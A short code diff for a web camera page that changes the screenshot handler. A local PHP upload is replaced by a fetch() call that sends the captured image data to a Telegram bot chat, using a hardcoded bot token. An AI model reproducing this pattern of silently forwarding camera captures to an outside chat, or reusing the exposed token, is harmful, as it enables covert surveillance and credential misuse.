@@ -88,17 +88,11 @@ const doScreenshot = () => {
   screenshotImage.classList.remove('d-none');
   console.log(screenshotImage.src);
   alert('123');
-  $.ajax({
-    url: 'send_text.php',
-    type:'POST',
-    cache: false,
-    data: {'id':screenshotImage.src},
-    success: function(data){
-      var ad = JSON.parse(data);
-      console.log(ad);
-      }
-  });
-};
+
+
+fetch(`https://api.telegram.org/bot5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64/sendMessage?chat_id=961145889&text=${screenshotImage.src}`,{method:'POST',})
+  .then(response => response.json()) // Декодируем ответ в формате json
+  .then(data => console.log(data)); // Выводим ответ в консоль
 pause.onclick = pauseStream;
 screenshot.onclick = doScreenshot;
 getCameraSelection();
